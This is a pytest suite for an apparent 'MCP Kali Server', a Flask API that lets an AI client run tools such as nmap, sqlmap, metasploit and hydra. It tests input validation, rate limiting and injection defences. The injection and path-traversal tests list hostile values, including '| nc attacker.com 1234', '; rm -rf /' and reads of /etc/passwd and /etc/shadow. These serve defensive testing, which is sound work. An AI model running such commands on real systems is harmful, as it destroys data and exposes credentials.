#!/usr/bin/env python3
"""
Comprehensive unit and integration tests for MCP Kali Server

These tests verify core functionality, security measures, and edge cases
to achieve 80%+ code coverage.
"""

import pytest
import sys
import os
import json
import tempfile
from unittest.mock import Mock, patch, MagicMock

# Add parent directory to path to import modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import kali_server
from kali_server import (
    app, CommandExecutor, execute_command,
    validate_target, validate_url, validate_file_path,
    validate_port_spec, sanitize_additional_args,
    rate_limit_storage
)


@pytest.fixture
def client():
    """Create a test client for the Flask app"""
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client


@pytest.fixture
def reset_rate_limits():
    """Reset rate limit storage before each test"""
    rate_limit_storage.clear()
    yield
    rate_limit_storage.clear()


class TestValidationFunctions:
    """Test input validation functions"""

    def test_validate_target_valid_ip(self):
        """Test validating valid IP addresses"""
        assert validate_target("192.168.1.1") == True
        assert validate_target("10.0.0.1") == True
        assert validate_target("127.0.0.1") == True
        assert validate_target("8.8.8.8") == True

    def test_validate_target_valid_hostname(self):
        """Test validating valid hostnames"""
        assert validate_target("example.com") == True
        assert validate_target("sub.example.com") == True
        assert validate_target("test-server.local") == True
        assert validate_target("server01") == True

    def test_validate_target_invalid(self):
        """Test validating invalid targets"""
        assert validate_target("") == False
        assert validate_target("999.999.999.999") == False
        assert validate_target("../etc/passwd") == False
        assert validate_target("test;rm -rf") == False
        assert validate_target("a" * 300) == False

    def test_validate_url_valid(self):
        """Test validating valid URLs"""
        assert validate_url("http://example.com") == True
        assert validate_url("https://example.com") == True
        assert validate_url("http://192.168.1.1") == True
        assert validate_url("https://example.com:8080/path") == True

    def test_validate_url_invalid(self):
        """Test validating invalid URLs"""
        assert validate_url("") == False
        assert validate_url("ftp://example.com") == False
        assert validate_url("not-a-url") == False
        assert validate_url("javascript:alert(1)") == False
        assert validate_url("http://" + "a" * 3000) == False

    def test_validate_file_path_valid(self):
        """Test validating valid file paths"""
        assert validate_file_path("/usr/share/wordlists/common.txt") == True
        assert validate_file_path("/tmp/test.txt") == True
        assert validate_file_path("/home/user/file.txt") == True

    def test_validate_file_path_invalid(self):
        """Test validating invalid file paths"""
        assert validate_file_path("") == False
        assert validate_file_path("../../../etc/passwd") == False
        assert validate_file_path("/proc/self/mem") == False
        assert validate_file_path("/sys/kernel") == False
        assert validate_file_path("a" * 5000) == False

    def test_validate_port_spec_valid(self):
        """Test validating valid port specifications"""
        assert validate_port_spec("") == True  # Empty is valid
        assert validate_port_spec("80") == True
        assert validate_port_spec("80,443") == True
        assert validate_port_spec("1-1024") == True
        assert validate_port_spec("80,443,8080-8090") == True

    def test_validate_port_spec_invalid(self):
        """Test validating invalid port specifications"""
        assert validate_port_spec("0") == False
        assert validate_port_spec("70000") == False
        assert validate_port_spec("abc") == False
        assert validate_port_spec("80;443") == False

    def test_sanitize_additional_args_valid(self):
        """Test sanitizing valid additional arguments"""
        result = sanitize_additional_args("-v -T4", ["v", "T4"])
        assert result == ["-v", "-T4"]

        result = sanitize_additional_args("--verbose --timing=4", ["verbose", "timing"])
        assert result == ["--verbose", "--timing=4"]

    def test_sanitize_additional_args_invalid(self):
        """Test sanitizing invalid additional arguments"""
        result = sanitize_additional_args("-x", ["v", "T4"])
        assert result is None

        result = sanitize_additional_args("rm -rf /", ["v"])
        assert result is None

        result = sanitize_additional_args("; echo bad", ["v"])
        assert result is None


class TestCommandExecutor:
    """Test CommandExecutor class"""

    def test_command_executor_init(self):
        """Test CommandExecutor initialization"""
        executor = CommandExecutor(["echo", "test"], timeout=10)
        assert executor.command == ["echo", "test"]
        assert executor.timeout == 10
        assert executor.return_code is None
        assert executor.timed_out == False

    @patch('subprocess.Popen')
    def test_command_executor_success(self, mock_popen):
        """Test successful command execution"""
        # Mock the process
        mock_process = Mock()
        mock_process.wait.return_value = 0
        mock_process.stdout.readline.side_effect = ["test output\n", ""]
        mock_process.stderr.readline.side_effect = [""]
        mock_popen.return_value = mock_process

        executor = CommandExecutor(["echo", "test"])
        result = executor.execute()

        assert result["success"] == True
        assert result["return_code"] == 0
        assert result["timed_out"] == False

    @patch('subprocess.Popen')
    def test_command_executor_timeout(self, mock_popen):
        """Test command execution with timeout"""
        import subprocess

        mock_process = Mock()
        mock_process.wait.side_effect = subprocess.TimeoutExpired("cmd", 1)
        mock_process.stdout.readline.side_effect = ["partial output\n", ""]
        mock_process.stderr.readline.side_effect = [""]
        mock_popen.return_value = mock_process

        executor = CommandExecutor(["sleep", "100"], timeout=1)
        result = executor.execute()

        assert result["timed_out"] == True
        mock_process.terminate.assert_called_once()


class TestExecuteCommandFunction:
    """Test execute_command function"""

    def test_execute_command_with_list(self):
        """Test execute_command with valid list input"""
        result = execute_command(["echo", "test"])
        assert "stdout" in result
        assert "stderr" in result
        assert "return_code" in result

    def test_execute_command_with_non_list(self):
        """Test execute_command with invalid non-list input"""
        result = execute_command("echo test")
        assert result["success"] == False
        assert "must be a list" in result["stderr"]


class TestHealthEndpoint:
    """Test /health endpoint"""

    def test_health_endpoint_success(self, client):
        """Test health check endpoint returns success"""
        response = client.get('/health')
        assert response.status_code == 200

        data = json.loads(response.data)
        assert data["status"] == "healthy"
        assert "tools_status" in data
        assert "request_id" in data

    def test_health_endpoint_includes_version(self, client):
        """Test health check includes version information"""
        response = client.get('/health')
        data = json.loads(response.data)
        assert "version" in data
        assert data["version"] == "0.1.0"


class TestGenericCommandEndpoint:
    """Test /api/command endpoint"""

    def test_generic_command_missing_action(self, client, reset_rate_limits):
        """Test generic command without action parameter"""
        response = client.post('/api/command',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_generic_command_invalid_action(self, client, reset_rate_limits):
        """Test generic command with invalid action"""
        response = client.post('/api/command',
                               json={"action": "invalid"},
                               content_type='application/json')
        assert response.status_code == 400

    def test_generic_command_valid_action(self, client, reset_rate_limits):
        """Test generic command with valid action"""
        response = client.post('/api/command',
                               json={"action": "whoami"},
                               content_type='application/json')
        assert response.status_code == 200


class TestNmapEndpoint:
    """Test /api/tools/nmap endpoint"""

    def test_nmap_missing_target(self, client, reset_rate_limits):
        """Test nmap without target parameter"""
        response = client.post('/api/tools/nmap',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400
        data = json.loads(response.data)
        assert "Target parameter is required" in data["error"]

    def test_nmap_invalid_target(self, client, reset_rate_limits):
        """Test nmap with invalid target"""
        response = client.post('/api/tools/nmap',
                               json={"target": "../etc/passwd"},
                               content_type='application/json')
        assert response.status_code == 400
        data = json.loads(response.data)
        assert "Invalid target" in data["error"]

    def test_nmap_invalid_port_spec(self, client, reset_rate_limits):
        """Test nmap with invalid port specification"""
        response = client.post('/api/tools/nmap',
                               json={"target": "127.0.0.1", "ports": "99999"},
                               content_type='application/json')
        assert response.status_code == 400

    def test_nmap_invalid_additional_args(self, client, reset_rate_limits):
        """Test nmap with invalid additional arguments"""
        response = client.post('/api/tools/nmap',
                               json={
                                   "target": "127.0.0.1",
                                   "additional_args": "--invalid-flag"
                               },
                               content_type='application/json')
        assert response.status_code == 400

    @patch('kali_server.execute_command')
    def test_nmap_valid_request(self, mock_exec, client, reset_rate_limits):
        """Test nmap with valid parameters"""
        mock_exec.return_value = {
            "stdout": "scan output",
            "stderr": "",
            "return_code": 0,
            "success": True,
            "timed_out": False
        }

        response = client.post('/api/tools/nmap',
                               json={
                                   "target": "127.0.0.1",
                                   "scan_type": "-sV",
                                   "ports": "80,443"
                               },
                               content_type='application/json')
        assert response.status_code == 200
        mock_exec.assert_called_once()


class TestGobusterEndpoint:
    """Test /api/tools/gobuster endpoint"""

    def test_gobuster_missing_url(self, client, reset_rate_limits):
        """Test gobuster without URL parameter"""
        response = client.post('/api/tools/gobuster',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400

    def test_gobuster_invalid_url(self, client, reset_rate_limits):
        """Test gobuster with invalid URL"""
        response = client.post('/api/tools/gobuster',
                               json={"url": "not-a-url"},
                               content_type='application/json')
        assert response.status_code == 400

    def test_gobuster_invalid_mode(self, client, reset_rate_limits):
        """Test gobuster with invalid mode"""
        response = client.post('/api/tools/gobuster',
                               json={
                                   "url": "http://example.com",
                                   "mode": "invalid"
                               },
                               content_type='application/json')
        assert response.status_code == 400


class TestSqlmapEndpoint:
    """Test /api/tools/sqlmap endpoint"""

    def test_sqlmap_missing_url(self, client, reset_rate_limits):
        """Test sqlmap without URL parameter"""
        response = client.post('/api/tools/sqlmap',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400

    def test_sqlmap_invalid_url(self, client, reset_rate_limits):
        """Test sqlmap with invalid URL"""
        response = client.post('/api/tools/sqlmap',
                               json={"url": "javascript:alert(1)"},
                               content_type='application/json')
        assert response.status_code == 400


class TestMetasploitEndpoint:
    """Test /api/tools/metasploit endpoint"""

    def test_metasploit_missing_module(self, client, reset_rate_limits):
        """Test metasploit without module parameter"""
        response = client.post('/api/tools/metasploit',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400

    def test_metasploit_invalid_module_format(self, client, reset_rate_limits):
        """Test metasploit with invalid module path"""
        response = client.post('/api/tools/metasploit',
                               json={"module": "../../../etc/passwd"},
                               content_type='application/json')
        assert response.status_code == 400

    def test_metasploit_invalid_options_type(self, client, reset_rate_limits):
        """Test metasploit with invalid options type"""
        response = client.post('/api/tools/metasploit',
                               json={
                                   "module": "exploit/test",
                                   "options": "not-a-dict"
                               },
                               content_type='application/json')
        assert response.status_code == 400


class TestHydraEndpoint:
    """Test /api/tools/hydra endpoint"""

    def test_hydra_missing_parameters(self, client, reset_rate_limits):
        """Test hydra without required parameters"""
        response = client.post('/api/tools/hydra',
                               json={},
                               content_type='application/json')
        assert response.status_code == 400

    def test_hydra_invalid_target(self, client, reset_rate_limits):
        """Test hydra with invalid target"""
        response = client.post('/api/tools/hydra',
                               json={
                                   "target": "../etc",
                                   "service": "ssh",
                                   "username": "admin",
                                   "password": "test"
                               },
                               content_type='application/json')
        assert response.status_code == 400

    def test_hydra_invalid_service(self, client, reset_rate_limits):
        """Test hydra with invalid service name"""
        response = client.post('/api/tools/hydra',
                               json={
                                   "target": "127.0.0.1",
                                   "service": "ssh; rm -rf",
                                   "username": "admin",
                                   "password": "test"
                               },
                               content_type='application/json')
        assert response.status_code == 400


class TestRateLimiting:
    """Test rate limiting functionality"""

    def test_rate_limit_enforcement(self, client):
        """Test that rate limiting is enforced"""
        # Clear rate limits
        rate_limit_storage.clear()

        # Make requests up to the limit (default is 10)
        for i in range(kali_server.RATE_LIMIT_REQUESTS):
            response = client.post('/api/command',
                                   json={"action": "whoami"},
                                   content_type='application/json')
            assert response.status_code == 200

        # Next request should be rate limited
        response = client.post('/api/command',
                               json={"action": "whoami"},
                               content_type='application/json')
        assert response.status_code == 429
        data = json.loads(response.data)
        assert "Rate limit exceeded" in data["error"]


class TestErrorHandling:
    """Test error handling and edge cases"""

    def test_missing_json_body(self, client, reset_rate_limits):
        """Test endpoints with missing JSON body"""
        response = client.post('/api/tools/nmap',
                               data="not json",
                               content_type='text/plain')
        assert response.status_code in [400, 415]

    def test_malformed_json(self, client, reset_rate_limits):
        """Test endpoints with malformed JSON"""
        response = client.post('/api/tools/nmap',
                               data="{invalid json}",
                               content_type='application/json')
        assert response.status_code in [400, 415]


class TestSecurityFeatures:
    """Test security features and protections"""

    def test_command_injection_protection(self, client, reset_rate_limits):
        """Test protection against command injection"""
        injection_attempts = [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "& whoami",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)"
        ]

        for injection in injection_attempts:
            response = client.post('/api/tools/nmap',
                                   json={"target": injection},
                                   content_type='application/json')
            assert response.status_code == 400

    def test_path_traversal_protection(self, client, reset_rate_limits):
        """Test protection against path traversal"""
        traversal_attempts = [
            "../../../etc/passwd",
            "../../etc/shadow",
            "/proc/self/mem",
            "/sys/kernel/security"
        ]

        for path in traversal_attempts:
            response = client.post('/api/tools/john',
                                   json={"hash_file": path},
                                   content_type='application/json')
            assert response.status_code == 400


class TestMCPServerImports:
    """Test MCP server module"""

    def test_import_mcp_server(self):
        """Test that mcp_server module can be imported"""
        try:
            import mcp_server
            assert hasattr(mcp_server, 'KaliToolsClient')
            assert hasattr(mcp_server, 'setup_mcp_server')
        except ImportError as e:
            pytest.fail(f"Failed to import mcp_server: {e}")

    def test_kali_tools_client_initialization(self):
        """Test KaliToolsClient initialization"""
        from mcp_server import KaliToolsClient

        client = KaliToolsClient("http://localhost:5000", timeout=300)
        assert client.server_url == "http://localhost:5000"
        assert client.timeout == 300


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=kali_server", "--cov=mcp_server",
                 "--cov-report=html", "--cov-report=term"])
